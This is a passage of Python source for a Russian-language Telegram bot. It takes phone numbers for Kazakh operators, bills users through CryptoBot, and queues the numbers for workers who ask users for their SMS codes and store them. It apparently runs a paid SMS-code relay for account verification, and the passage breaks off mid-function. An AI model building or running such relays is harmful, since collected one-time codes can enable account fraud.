import asyncio
import contextlib
import csv
import json
import logging
import os
import random
import re
import sqlite3
import tempfile
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, FSInputFile, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder
from dotenv import load_dotenv

DB_PATH = "bot.db"


@dataclass
class Config:
    bot_token: str
    superadmins: List[str]
    currency: str
    operator_prices: Dict[str, int]
    crypto_pay_api_token: str
    crypto_pay_testnet: bool
    crypto_pay_accepted_assets: str
    auto_pay_check_interval: int
    welcome_sticker_file_id: str


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def normalize_username(value: Optional[str]) -> Optional[str]:
    if not value:
        return None
    raw = value.strip().lstrip("@").lower()
    if not re.fullmatch(r"[a-zA-Z0-9_]{5,32}", raw):
        return None
    return raw


def parse_price_map(raw: str) -> Dict[str, int]:
    result: Dict[str, int] = {}
    for chunk in [x.strip() for x in raw.split(",") if x.strip()]:
        if ":" not in chunk:
            continue
        name, amount = chunk.split(":", 1)
        name = name.strip()
        amount = amount.strip()
        if name and re.fullmatch(r"\d+(\.\d+)?", amount):
            result[name] = int(round(float(amount) * 100))
    return result


def parse_usernames(raw: str) -> List[str]:
    out = []
    for item in raw.split(","):
        username = normalize_username(item)
        if username:
            out.append(username)
    return sorted(set(out))


def load_config() -> Config:
    load_dotenv()

    bot_token = os.getenv("BOT_TOKEN", "").strip()
    if not bot_token:
        raise ValueError("BOT_TOKEN is required")

    operator_prices = parse_price_map(
        os.getenv("OPERATOR_PRICES", "Beeline KZ:5,Kcell:6,activ:6,Tele2 KZ:4,ALTEL:4")
    )
    if not operator_prices:
        raise ValueError("OPERATOR_PRICES must contain at least one valid operator:price pair")

    return Config(
        bot_token=bot_token,
        superadmins=parse_usernames(os.getenv("SUPERADMINS", "")),
        currency=os.getenv("CURRENCY", "USD").strip().upper(),
        operator_prices=operator_prices,
        crypto_pay_api_token=os.getenv("CRYPTO_PAY_API_TOKEN", "").strip(),
        crypto_pay_testnet=os.getenv("CRYPTO_PAY_TESTNET", "false").strip().lower() in {"1", "true", "yes"},
        crypto_pay_accepted_assets=os.getenv("CRYPTO_PAY_ACCEPTED_ASSETS", "USDT,TON,BTC").strip(),
        auto_pay_check_interval=max(5, int(os.getenv("AUTO_PAY_CHECK_INTERVAL", "20"))),
        welcome_sticker_file_id=os.getenv("WELCOME_STICKER_FILE_ID", "").strip(),
    )


def init_db() -> None:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            full_name TEXT,
            joined_at TEXT NOT NULL,
            last_seen_at TEXT NOT NULL
        )
        """
    )

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS user_flags (
            username TEXT PRIMARY KEY,
            role TEXT NOT NULL DEFAULT 'user',
            free_access INTEGER NOT NULL DEFAULT 0,
            priority_access INTEGER NOT NULL DEFAULT 0,
            banned INTEGER NOT NULL DEFAULT 0,
            updated_at TEXT NOT NULL
        )
        """
    )

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS verification_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            username TEXT,
            full_name TEXT,
            operator TEXT NOT NULL,
            phone TEXT NOT NULL,
            tariff_name TEXT NOT NULL,
            tariff_amount INTEGER NOT NULL,
            status TEXT NOT NULL,
            assigned_admin_id INTEGER,
            sms_code TEXT,
            created_at TEXT NOT NULL,
            updated_at TEXT NOT NULL,
            crypto_invoice_id INTEGER,
            crypto_invoice_url TEXT,
            payment_method TEXT,
            is_priority INTEGER NOT NULL DEFAULT 0
        )
        """
    )

    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS admin_audit (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_username TEXT,
            action TEXT NOT NULL,
            target_username TEXT,
            details TEXT,
            created_at TEXT NOT NULL
        )
        """
    )
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS bot_settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        )
        """
    )

    cur.execute("PRAGMA table_info(user_flags)")
    user_flag_cols = {row[1] for row in cur.fetchall()}
    if "banned" not in user_flag_cols:
        cur.execute("ALTER TABLE user_flags ADD COLUMN banned INTEGER NOT NULL DEFAULT 0")

    cur.execute("PRAGMA table_info(verification_requests)")
    request_cols = {row[1] for row in cur.fetchall()}
    for name, kind in (
        ("crypto_invoice_id", "INTEGER"),
        ("crypto_invoice_url", "TEXT"),
        ("payment_method", "TEXT"),
        ("is_priority", "INTEGER NOT NULL DEFAULT 0"),
    ):
        if name not in request_cols:
            cur.execute(f"ALTER TABLE verification_requests ADD COLUMN {name} {kind}")

    conn.commit()
    conn.close()


def upsert_user(user_id: int, username: Optional[str], full_name: str) -> None:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    ts = now_iso()
    cur.execute(
        """
        INSERT INTO users (user_id, username, full_name, joined_at, last_seen_at)
        VALUES (?, ?, ?, ?, ?)
        ON CONFLICT(user_id) DO UPDATE SET
            username = excluded.username,
            full_name = excluded.full_name,
            last_seen_at = excluded.last_seen_at
        """,
        (user_id, username, full_name, ts, ts),
    )
    conn.commit()
    conn.close()


def get_setting(key: str) -> Optional[str]:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT value FROM bot_settings WHERE key=?", (key,))
    row = cur.fetchone()
    conn.close()
    return row[0] if row else None


def set_setting(key: str, value: str) -> None:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO bot_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
        (key, value),
    )
    conn.commit()
    conn.close()


def get_start_stickers(config: Config) -> List[str]:
    raw = get_setting("start_stickers")
    stickers: List[str] = []
    if raw:
        with contextlib.suppress(Exception):
            parsed = json.loads(raw)
            if isinstance(parsed, list):
                stickers.extend([str(x).strip() for x in parsed if str(x).strip()])
    if config.welcome_sticker_file_id:
        stickers.append(config.welcome_sticker_file_id)
    # remove duplicates preserving order
    seen = set()
    uniq: List[str] = []
    for s in stickers:
        if s not in seen:
            seen.add(s)
            uniq.append(s)
    return uniq


def add_start_sticker(file_id: str) -> None:
    current_raw = get_setting("start_stickers")
    current: List[str] = []
    if current_raw:
        with contextlib.suppress(Exception):
            loaded = json.loads(current_raw)
            if isinstance(loaded, list):
                current = [str(x) for x in loaded]
    if file_id not in current:
        current.append(file_id)
    set_setting("start_stickers", json.dumps(current, ensure_ascii=True))


def clear_start_stickers() -> None:
    set_setting("start_stickers", "[]")


def ensure_flag(username: str) -> None:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO user_flags (username, role, free_access, priority_access, banned, updated_at)
        VALUES (?, 'user', 0, 0, 0, ?)
        ON CONFLICT(username) DO NOTHING
        """,
        (username, now_iso()),
    )
    conn.commit()
    conn.close()


def set_role(username: str, role: str) -> None:
    ensure_flag(username)
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("UPDATE user_flags SET role=?, updated_at=? WHERE username=?", (role, now_iso(), username))
    conn.commit()
    conn.close()


def set_access(username: str, free: Optional[int] = None, prio: Optional[int] = None, ban: Optional[int] = None) -> None:
    ensure_flag(username)
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    if free is not None:
        cur.execute("UPDATE user_flags SET free_access=?, updated_at=? WHERE username=?", (int(bool(free)), now_iso(), username))
    if prio is not None:
        cur.execute("UPDATE user_flags SET priority_access=?, updated_at=? WHERE username=?", (int(bool(prio)), now_iso(), username))
    if ban is not None:
        cur.execute("UPDATE user_flags SET banned=?, updated_at=? WHERE username=?", (int(bool(ban)), now_iso(), username))
    conn.commit()
    conn.close()


def get_flags(username: Optional[str]) -> Dict[str, int | str]:
    if not username:
        return {"role": "user", "free_access": 0, "priority_access": 0, "banned": 0}

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT role, free_access, priority_access, banned FROM user_flags WHERE username=?", (username,))
    row = cur.fetchone()
    conn.close()

    if not row:
        return {"role": "user", "free_access": 0, "priority_access": 0, "banned": 0}
    return {"role": row[0], "free_access": int(row[1]), "priority_access": int(row[2]), "banned": int(row[3])}


def is_banned(username: Optional[str]) -> bool:
    return int(get_flags(username).get("banned", 0)) == 1


def log_admin_action(admin_username: Optional[str], action: str, target_username: Optional[str], details: str = "") -> None:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO admin_audit (admin_username, action, target_username, details, created_at) VALUES (?, ?, ?, ?, ?)",
        (admin_username, action, target_username, details, now_iso()),
    )
    conn.commit()
    conn.close()


def create_request(
    user_id: int,
    username: Optional[str],
    full_name: str,
    operator: str,
    phone: str,
    tariff_name: str,
    tariff_amount: int,
    status: str,
    payment_method: str,
    is_priority: int = 0,
    crypto_invoice_id: Optional[int] = None,
    crypto_invoice_url: Optional[str] = None,
) -> int:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    ts = now_iso()
    cur.execute(
        """
        INSERT INTO verification_requests (
            user_id, username, full_name, operator, phone, tariff_name, tariff_amount, status,
            assigned_admin_id, sms_code, created_at, updated_at,
            crypto_invoice_id, crypto_invoice_url, payment_method, is_priority
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, NULL, NULL, ?, ?, ?, ?, ?, ?)
        """,
        (
            user_id,
            username,
            full_name,
            operator,
            phone,
            tariff_name,
            tariff_amount,
            status,
            ts,
            ts,
            crypto_invoice_id,
            crypto_invoice_url,
            payment_method,
            int(bool(is_priority)),
        ),
    )
    request_id = int(cur.lastrowid)
    conn.commit()
    conn.close()
    return request_id


def get_request(request_id: int) -> Optional[Tuple]:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT * FROM verification_requests WHERE id=?", (request_id,))
    row = cur.fetchone()
    conn.close()
    return row


def update_request_status(request_id: int, status: str, admin_id: Optional[int] = None) -> None:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    if admin_id is None:
        cur.execute("UPDATE verification_requests SET status=?, updated_at=? WHERE id=?", (status, now_iso(), request_id))
    else:
        cur.execute(
            "UPDATE verification_requests SET status=?, assigned_admin_id=?, updated_at=? WHERE id=?",
            (status, admin_id, now_iso(), request_id),
        )
    conn.commit()
    conn.close()


def save_sms_code(request_id: int, code: str) -> None:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "UPDATE verification_requests SET sms_code=?, status='code_received', updated_at=? WHERE id=?",
        (code, now_iso(), request_id),
    )
    conn.commit()
    conn.close()


def get_admin_user_ids(config: Config) -> List[int]:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT username FROM user_flags WHERE role='admin'")
    managed_admins = {row[0] for row in cur.fetchall() if row and row[0]}
    all_admins = managed_admins.union(set(config.superadmins))
    if not all_admins:
        conn.close()
        return []

    placeholders = ",".join(["?"] * len(all_admins))
    cur.execute(f"SELECT user_id FROM users WHERE username IN ({placeholders})", tuple(all_admins))
    ids = sorted({int(row[0]) for row in cur.fetchall() if row and row[0] is not None})
    conn.close()
    return ids


def is_admin(username: Optional[str], config: Config) -> bool:
    uname = normalize_username(username)
    if not uname:
        return False
    if uname in config.superadmins:
        return True
    return get_flags(uname).get("role") == "admin"


def is_worker(username: Optional[str], config: Config) -> bool:
    uname = normalize_username(username)
    if not uname:
        return False
    if uname in config.superadmins:
        return True
    role = get_flags(uname).get("role")
    return role in {"worker", "admin"}


async def notify_admins(bot: Bot, config: Config, text: str, markup=None) -> None:
    for admin_id in get_admin_user_ids(config):
        try:
            await bot.send_message(admin_id, text, reply_markup=markup)
        except TelegramBadRequest:
            continue


def cryptopay_base_url(config: Config) -> str:
    return "https://testnet-pay.crypt.bot/api" if config.crypto_pay_testnet else "https://pay.crypt.bot/api"


async def cryptopay_call(config: Config, method: str, payload: Optional[Dict] = None):
    if not config.crypto_pay_api_token:
        raise RuntimeError("CRYPTO_PAY_API_TOKEN is empty")

    headers = {"Crypto-Pay-API-Token": config.crypto_pay_api_token}
    url = f"{cryptopay_base_url(config)}/{method}"

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20)) as session:
        async with session.post(url, json=payload or {}, headers=headers) as response:
            data = await response.json(content_type=None)

    if not data.get("ok"):
        raise RuntimeError(str(data.get("error", "Crypto Pay API error")))
    return data.get("result")


async def create_crypto_invoice(config: Config, amount_usd: float, description: str, payload: str) -> Tuple[int, str]:
    result = await cryptopay_call(
        config,
        "createInvoice",
        {
            "currency_type": "fiat",
            "fiat": "USD",
            "amount": f"{amount_usd:.2f}",
            "accepted_assets": config.crypto_pay_accepted_assets,
            "description": description,
            "payload": payload,
        },
    )
    invoice_id = int(result["invoice_id"])
    pay_url = result.get("bot_invoice_url") or result.get("mini_app_invoice_url") or ""
    if not pay_url:
        raise RuntimeError("Crypto Pay invoice URL not found")
    return invoice_id, pay_url


async def get_crypto_invoice_status(config: Config, invoice_id: int) -> str:
    result = await cryptopay_call(config, "getInvoices", {"invoice_ids": str(invoice_id)})
    items = result.get("items", []) if isinstance(result, dict) else result
    if not items:
        return "not_found"
    return items[0].get("status", "unknown")


async def promote_paid_request(bot: Bot, config: Config, request_id: int, source: str) -> bool:
    row = get_request(request_id)
    if not row or row[8] != "awaiting_payment":
        return False

    update_request_status(request_id, "paid_queued")
    row = get_request(request_id)
    if not row:
        return False

    try:
        await bot.send_message(row[1], f"✅ Оплата подтверждена. Заявка #{request_id} отправлена в очередь.")
    except TelegramBadRequest:
        pass

    await notify_admins(bot, config, request_caption(row), markup=build_admin_request_actions(request_id))
    log_admin_action("system", "payment_confirmed", row[2], f"request_id={request_id};source={source}")
    return True


class UserStates(StatesGroup):
    waiting_phone = State()


class AdminStates(StatesGroup):
    waiting_input = State()
    waiting_sticker = State()


router = Router()


def build_main_menu(is_admin_user: bool, is_worker_user: bool):
    kb = InlineKeyboardBuilder()
    kb.button(text="📲 Сдать номер на вериф", callback_data="start_verify")
    if is_admin_user:
        kb.button(text="🛠 Админ-панель", callback_data="admin_panel")
    if is_worker_user:
        kb.button(text="👷 Панель рабочего", callback_data="worker_panel")
    kb.adjust(1)
    return kb.as_markup()


def build_operator_menu(config: Config):
    kb = InlineKeyboardBuilder()
    for operator, amount in config.operator_prices.items():
        kb.button(text=f"📱 {operator} · {amount / 100:.2f} {config.currency}", callback_data=f"operator:{operator}")
    kb.adjust(2)
    return kb.as_markup()


def build_payment_menu(request_id: int, url: str):
    kb = InlineKeyboardBuilder()
    kb.button(text="💳 Оплатить", url=url)
    kb.button(text="✅ Проверить оплату", callback_data=f"checkpay:{request_id}")
    kb.adjust(1)
    return kb.as_markup()


def build_admin_request_actions(request_id: int):
    kb = InlineKeyboardBuilder()
    kb.button(text="🧰 Взять в работу", callback_data=f"admin_take:{request_id}")
    kb.button(text="🔐 Запросить код", callback_data=f"admin_need_code:{request_id}")
    kb.button(text="✅ Успешно", callback_data=f"admin_success:{request_id}")
    kb.button(text="❌ Ошибка", callback_data=f"admin_error:{request_id}")
    kb.adjust(1)
    return kb.as_markup()


def build_admin_panel_menu():
    kb = InlineKeyboardBuilder()
    buttons = [
        ("👥 Пользователи", "admin_users"),
        ("🔎 Поиск user", "admin_find_user"),
        ("🧾 Очередь", "admin_queue"),
        ("📤 Экспорт CSV", "admin_export_queue"),
        ("🕓 История", "admin_history"),
        ("📊 Статистика", "admin_stats"),
        ("➕ Выдать админку", "admin_setrole:admin"),
        ("➖ Убрать админку", "admin_setrole:user"),
        ("👷 Выдать рабочего", "admin_setrole:worker"),
        ("🚫 Убрать рабочего", "admin_setrole:user"),
        ("🎁 Выдать free", "admin_setfree:1"),
        ("🚫 Убрать free", "admin_setfree:0"),
        ("⚡ Выдать приоритет", "admin_setprio:1"),
        ("⏬ Убрать приоритет", "admin_setprio:0"),
        ("⛔ Бан", "admin_setban:1"),
        ("♻ Разбан", "admin_setban:0"),
        ("✨ Добавить стикер", "admin_add_sticker"),
        ("🧹 Очистить стикеры", "admin_clear_stickers"),
    ]
    for text, data in buttons:
        kb.button(text=text, callback_data=data)
    kb.adjust(2, 2, 2, 2, 2, 2, 2, 2)
    return kb.as_markup()


def build_worker_panel_menu():
    kb = InlineKeyboardBuilder()
    kb.button(text="📥 Взять номер", callback_data="worker_take")
    kb.adjust(1)
    return kb.as_markup()


def build_worker_request_actions(request_id: int):
    kb = InlineKeyboardBuilder()
    kb.button(text="🔐 Запросить код", callback_data=f"worker_need_code:{request_id}")
    kb.button(text="✅ Успешно", callback_data=f"worker_success:{request_id}")
    kb.button(text="❌ Ошибка", callback_data=f"worker_error:{request_id}")
    kb.adjust(1)
    return kb.as_markup()


def request_caption(row: Tuple) -> str:
    request_id, user_id, username, full_name, operator, phone, tariff_name, tariff_amount, status, assigned_admin_id, sms_code = row[:11]
    payment_method = row[15] if len(row) > 15 else "-"
    is_priority = int(row[16]) if len(row) > 16 and row[16] is not None else 0
    return (
        f"🧾 Заявка #{request_id}\n"
        f"👤 Пользователь: {full_name} (@{username or '-'}) [{user_id}]\n"
        f"📶 Оператор: {operator}\n"
        f"📱 Номер: {phone}\n"
        f"📦 Тариф: {tariff_name} ({tariff_amount / 100:.2f})\n"
        f"💳 Оплата: {payment_method}\n"
        f"⚡ Приоритет: {'да' if is_priority else 'нет'}\n"
        f"📌 Статус: {status}\n"
        f"🔐 Код: {sms_code or '-'}\n"
        f"🧑‍💼 Исполнитель: {assigned_admin_id or '-'}"
    )

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext, config: Config):
    username = normalize_username(message.from_user.username)
    upsert_user(message.from_user.id, username, message.from_user.full_name)
    if username and username in config.superadmins:
        set_role(username, "admin")

    await state.clear()
    admin_mode = is_admin(username, config)
    worker_mode = is_worker(username, config)
    stickers = get_start_stickers(config)
    if stickers:
        random.shuffle(stickers)
        for sticker_id in stickers[:2]:
            with contextlib.suppress(TelegramBadRequest):
                await message.answer_sticker(sticker_id)

    text = "👋 Привет! Добро пожаловать.\nВыбери действие ниже и поехали."
    if admin_mode:
        text += "\n\n🛠 Админ-панель доступна в меню."
    if worker_mode:
        text += "\n\n👷 Панель рабочего доступна в меню."
    await message.answer(text, reply_markup=build_main_menu(admin_mode, worker_mode))


@router.callback_query(F.data == "start_verify")
async def start_verify(callback: CallbackQuery, state: FSMContext, config: Config):
    username = normalize_username(callback.from_user.username)
    upsert_user(callback.from_user.id, username, callback.from_user.full_name)

    if not username:
        await callback.answer("⚠️ Сначала установи username в Telegram", show_alert=True)
        await callback.message.answer("ℹ️ Для работы нужен @username. Добавь его в настройках Telegram.")
        return

    if is_banned(username):
        await callback.answer("⛔ Доступ ограничен", show_alert=True)
        await callback.message.answer("⛔ Ваш аккаунт заблокирован администратором.")
        return

    await state.clear()
    await callback.message.answer("📶 Выбери оператора:", reply_markup=build_operator_menu(config))
    await callback.answer()


@router.callback_query(F.data.startswith("operator:"))
async def choose_operator(callback: CallbackQuery, state: FSMContext):
    operator = callback.data.split(":", 1)[1]
    await state.update_data(operator=operator)
    await state.set_state(UserStates.waiting_phone)
    await callback.message.answer(f"📶 Оператор: {operator}\n📱 Отправь номер в формате +77001234567")
    await callback.answer()


@router.message(UserStates.waiting_phone)
async def get_phone(message: Message, state: FSMContext, config: Config, bot: Bot):
    username = normalize_username(message.from_user.username)
    upsert_user(message.from_user.id, username, message.from_user.full_name)

    if not username:
        await message.answer("⚠️ Нужен username в Telegram. Добавь и начни заново: /start")
        await state.clear()
        return

    if is_banned(username):
        await message.answer("⛔ Ваш аккаунт заблокирован администратором.")
        await state.clear()
        return

    phone = message.text.strip()
    if not re.fullmatch(r"\+?\d{10,15}", phone):
        await message.answer("❌ Неверный формат. Пример: +77001234567")
        return

    data = await state.get_data()
    operator = data.get("operator")
    if not operator:
        await message.answer("⚠️ Сначала выбери оператора: /start")
        await state.clear()
        return

    amount = config.operator_prices.get(operator)
    if not amount:
        await message.answer("❌ Цена для оператора не найдена. Начни заново: /start")
        await state.clear()
        return

    flags = get_flags(username)
    is_free = int(flags.get("free_access", 0)) == 1
    is_priority = int(flags.get("priority_access", 0)) == 1

    if is_free:
        request_id = create_request(
            message.from_user.id,
            username,
            message.from_user.full_name,
            operator,
            phone,
            f"{operator} verify",
            0,
            "paid_queued",
            "free_pass",
            int(is_priority),
        )
        await state.clear()
        await message.answer(f"🎉 Заявка #{request_id} создана без оплаты (free-доступ).\nОтправлено админу в очередь.")
        row = get_request(request_id)
        if row:
            await notify_admins(bot, config, request_caption(row), markup=build_admin_request_actions(request_id))
        return

    if not config.crypto_pay_api_token:
        await message.answer("⚠️ Крипто-оплата не настроена. Заполни CRYPTO_PAY_API_TOKEN в .env")
        await state.clear()
        return

    payload = f"verify_payment:{message.from_user.id}:{int(datetime.now().timestamp())}"
    human_amount = f"{amount / 100:.2f} {config.currency}"

    try:
        invoice_id, pay_url = await create_crypto_invoice(config, amount / 100, f"Верификация номера ({operator})", payload)
    except Exception as exc:
        await message.answer(f"❌ Не удалось создать счет в CryptoBot: {exc}")
        await state.clear()
        return

    request_id = create_request(
        message.from_user.id,
        username,
        message.from_user.full_name,
        operator,
        phone,
        f"{operator} verify",
        amount,
        "awaiting_payment",
        "crypto_pay",
        int(is_priority),
        invoice_id,
        pay_url,
    )

    await state.clear()
    await message.answer(
        f"🧾 Заявка #{request_id} создана\n💰 Сумма: {human_amount}\nОплати счет и нажми \"Проверить оплату\".",
        reply_markup=build_payment_menu(request_id, pay_url),
    )


@router.callback_query(F.data.startswith("checkpay:"))
async def check_payment(callback: CallbackQuery, bot: Bot, config: Config):
    request_id = int(callback.data.split(":", 1)[1])
    row = get_request(request_id)
    if not row:
        await callback.answer("❌ Заявка не найдена", show_alert=True)
        return

    caller = normalize_username(callback.from_user.username)
    if callback.from_user.id != row[1] and not is_admin(caller, config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    if row[8] != "awaiting_payment":
        await callback.answer(f"ℹ️ Статус: {row[8]}", show_alert=True)
        return

    invoice_id = row[13]
    if not invoice_id:
        await callback.answer("❌ Счет не найден", show_alert=True)
        return

    try:
        status = await get_crypto_invoice_status(config, int(invoice_id))
    except Exception as exc:
        await callback.answer(f"⚠️ Ошибка проверки: {exc}", show_alert=True)
        return

    if status != "paid":
        await callback.answer(f"⏳ Оплата не подтверждена (статус: {status})", show_alert=True)
        return

    await promote_paid_request(bot, config, request_id, "manual")
    await callback.answer("✅ Оплата подтверждена")
    await callback.message.edit_text(f"✅ Оплата подтверждена. Заявка #{request_id} отправлена админу в очередь.")


@router.callback_query(F.data == "admin_panel")
async def open_admin_panel(callback: CallbackQuery, config: Config):
    if not is_admin(normalize_username(callback.from_user.username), config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return
    await callback.message.answer("🛠 Админ-панель", reply_markup=build_admin_panel_menu())
    await callback.answer()


@router.callback_query(F.data == "worker_panel")
async def open_worker_panel(callback: CallbackQuery, config: Config):
    if not is_worker(normalize_username(callback.from_user.username), config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return
    await callback.message.answer("👷 Панель рабочего", reply_markup=build_worker_panel_menu())
    await callback.answer()


@router.callback_query(F.data == "worker_take")
async def worker_take(callback: CallbackQuery, config: Config):
    actor = normalize_username(callback.from_user.username)
    if not is_worker(actor, config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        """
        SELECT id
        FROM verification_requests
        WHERE assigned_admin_id=? AND status IN ('in_progress','waiting_user_code','code_received')
        ORDER BY updated_at DESC
        LIMIT 1
        """,
        (callback.from_user.id,),
    )
    active = cur.fetchone()
    if active:
        request_id = int(active[0])
        conn.close()
        row = get_request(request_id)
        if not row:
            await callback.answer("❌ Заявка не найдена", show_alert=True)
            return
        await callback.message.answer("ℹ️ У тебя уже есть активная заявка:")
        await callback.message.answer(request_caption(row), reply_markup=build_worker_request_actions(request_id))
        await callback.answer()
        return

    cur.execute(
        """
        SELECT id
        FROM verification_requests
        WHERE status='paid_queued'
        ORDER BY is_priority DESC, id ASC
        LIMIT 1
        """
    )
    row = cur.fetchone()
    conn.close()

    if not row:
        await callback.answer("🧾 Очередь пуста", show_alert=True)
        return

    request_id = int(row[0])
    update_request_status(request_id, "in_progress", callback.from_user.id)
    req = get_request(request_id)
    if not req:
        await callback.answer("❌ Заявка не найдена", show_alert=True)
        return

    log_admin_action(actor, "worker_take", req[2], f"request_id={request_id}")
    await callback.message.answer(request_caption(req), reply_markup=build_worker_request_actions(request_id))
    await callback.answer("🧰 Номер выдан")


@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery, config: Config):
    if not is_admin(normalize_username(callback.from_user.username), config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        """
        SELECT u.username, u.full_name, u.user_id, COALESCE(f.role,'user'), COALESCE(f.free_access,0), COALESCE(f.priority_access,0), COALESCE(f.banned,0)
        FROM users u
        LEFT JOIN user_flags f ON u.username=f.username
        ORDER BY u.last_seen_at DESC
        LIMIT 50
        """
    )
    rows = cur.fetchall()
    conn.close()

    lines = ["👥 Пользователи (последние 50):"]
    if not rows:
        lines.append("Пока пусто")
    for uname, full_name, user_id, role, free, prio, banned in rows:
        lines.append(
            f"@{uname or '-'} | {full_name} | id:{user_id} | role:{role} | free:{free} | priority:{prio} | banned:{banned}"
        )

    text = "\n".join(lines)
    if len(text) > 3900:
        text = text[:3900] + "\n..."

    await callback.message.answer(text)
    await callback.answer()


@router.callback_query(F.data == "admin_find_user")
async def admin_find_user(callback: CallbackQuery, state: FSMContext, config: Config):
    if not is_admin(normalize_username(callback.from_user.username), config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return
    await state.set_state(AdminStates.waiting_input)
    await state.update_data(admin_action="admin_find_user")
    await callback.message.answer("🔎 Отправь username для поиска (пример: @username)")
    await callback.answer()

@router.callback_query(F.data == "admin_queue")
async def admin_queue(callback: CallbackQuery, config: Config):
    if not is_admin(normalize_username(callback.from_user.username), config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        """
        SELECT id, username, phone, operator, status, is_priority
        FROM verification_requests
        WHERE status IN ('awaiting_payment','paid_queued','in_progress','waiting_user_code','code_received')
        ORDER BY is_priority DESC, id ASC
        LIMIT 60
        """
    )
    rows = cur.fetchall()
    conn.close()

    if not rows:
        await callback.message.answer("🧾 Очередь пуста")
        await callback.answer()
        return

    lines = ["🧾 Очередь:"]
    for request_id, username, phone, operator, status, is_priority in rows:
        prio_mark = "⚡" if int(is_priority) else "•"
        lines.append(f"{prio_mark} #{request_id} | @{username or '-'} | {operator} | {phone} | {status}")
    await callback.message.answer("\n".join(lines))
    await callback.answer()


@router.callback_query(F.data == "admin_export_queue")
async def admin_export_queue(callback: CallbackQuery, config: Config):
    if not is_admin(normalize_username(callback.from_user.username), config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        """
        SELECT id, username, full_name, operator, phone, tariff_amount, status, is_priority, created_at
        FROM verification_requests
        WHERE status IN ('awaiting_payment','paid_queued','in_progress','waiting_user_code','code_received')
        ORDER BY is_priority DESC, id ASC
        """
    )
    rows = cur.fetchall()
    conn.close()

    with tempfile.NamedTemporaryFile(mode="w", newline="", suffix=".csv", delete=False, encoding="utf-8") as tmp:
        writer = csv.writer(tmp)
        writer.writerow(["id", "username", "full_name", "operator", "phone", "amount", "status", "priority", "created_at"])
        for row in rows:
            writer.writerow(row)
        file_path = tmp.name

    try:
        await callback.message.answer_document(FSInputFile(file_path, filename="queue_export.csv"))
    finally:
        try:
            os.remove(file_path)
        except OSError:
            pass

    await callback.answer("📤 Экспорт готов")


@router.callback_query(F.data == "admin_history")
async def admin_history(callback: CallbackQuery, config: Config):
    if not is_admin(normalize_username(callback.from_user.username), config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT admin_username, action, target_username, details, created_at FROM admin_audit ORDER BY id DESC LIMIT 30")
    rows = cur.fetchall()
    conn.close()

    if not rows:
        await callback.message.answer("🕓 История пуста")
        await callback.answer()
        return

    lines = ["🕓 Последние действия админов:"]
    for admin_username, action, target_username, details, created_at in rows:
        lines.append(f"[{created_at}] @{admin_username or '-'} -> {action} @{target_username or '-'} | {details}")

    text = "\n".join(lines)
    if len(text) > 3900:
        text = text[:3900] + "\n..."
    await callback.message.answer(text)
    await callback.answer()


@router.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery, config: Config):
    if not is_admin(normalize_username(callback.from_user.username), config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM users")
    users = int(cur.fetchone()[0])
    cur.execute("SELECT COUNT(*) FROM user_flags WHERE role='admin'")
